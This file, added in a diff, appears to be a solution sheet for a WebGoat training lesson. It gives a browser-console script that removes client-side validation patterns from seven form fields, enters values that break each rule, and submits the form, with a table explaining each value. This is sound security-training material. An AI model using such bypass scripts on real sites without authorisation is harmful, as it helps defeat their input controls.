@@ -1,0 +1,67 @@
+╔══════════════════════════════════════════════════════════════╗
+║     INPUT VALIDATION BYPASS - BROWSER CONSOLE SOLUTION      ║
+╚══════════════════════════════════════════════════════════════╝
+
+❗ PowerShell endpoint was 404 - Use Browser Console instead!
+
+═══════════════════════════════════════════════════════════════
+🎯 QUICK SOLUTION - COPY & PASTE:
+═══════════════════════════════════════════════════════════════
+
+1. Open WebGoat lesson page in Firefox
+2. Press F12 → Console tab
+3. Copy this ENTIRE script and paste:
+
+───────────────────────────────────────────────────────────────
+// Remove validation and set invalid values
+document.querySelector('input[name="field1"]').removeAttribute('pattern');
+document.querySelector('input[name="field1"]').value = 'ABC';
+
+document.querySelector('input[name="field2"]').removeAttribute('pattern');
+document.querySelector('input[name="field2"]').value = 'abc';
+
+document.querySelector('input[name="field3"]').removeAttribute('pattern');
+document.querySelector('input[name="field3"]').value = 'test!';
+
+document.querySelector('input[name="field4"]').removeAttribute('pattern');
+document.querySelector('input[name="field4"]').value = 'ten';
+
+document.querySelector('input[name="field5"]').removeAttribute('pattern');
+document.querySelector('input[name="field5"]').value = '1234';
+
+document.querySelector('input[name="field6"]').removeAttribute('pattern');
+document.querySelector('input[name="field6"]').value = '123456789';
+
+document.querySelector('input[name="field7"]').removeAttribute('pattern');
+document.querySelector('input[name="field7"]').value = '101-234-5678';
+
+// Submit the form
+document.querySelector('form').submit();
+───────────────────────────────────────────────────────────────
+
+4. Press Enter
+5. Wait for response!
+
+═══════════════════════════════════════════════════════════════
+📋 WHAT THESE VALUES DO:
+═══════════════════════════════════════════════════════════════
+
+field1 = ABC              ✗ Uppercase (should be lowercase)
+field2 = abc              ✗ Letters (should be digits)
+field3 = test!            ✗ Special char (should be alphanumeric)
+field4 = ten              ✗ Not in list (should be one-nine)
+field5 = 1234             ✗ 4 digits (should be 5)
+field6 = 123456789        ✗ Wrong format (should be zip code)
+field7 = 101-234-5678     ✗ Starts with 1 (should start 2-9)
+
+═══════════════════════════════════════════════════════════════
+📁 FILES CREATED:
+═══════════════════════════════════════════════════════════════
+
+✓ bypass_validation_attack.ps1     - PowerShell version (404 error)
+✓ bypass_validation.js              - Browser console functions
+✓ INPUT_VALIDATION_BYPASS_GUIDE.txt - Complete documentation
+
+═══════════════════════════════════════════════════════════════
+✅ SUCCESS = All validations bypassed!
+═══════════════════════════════════════════════════════════════
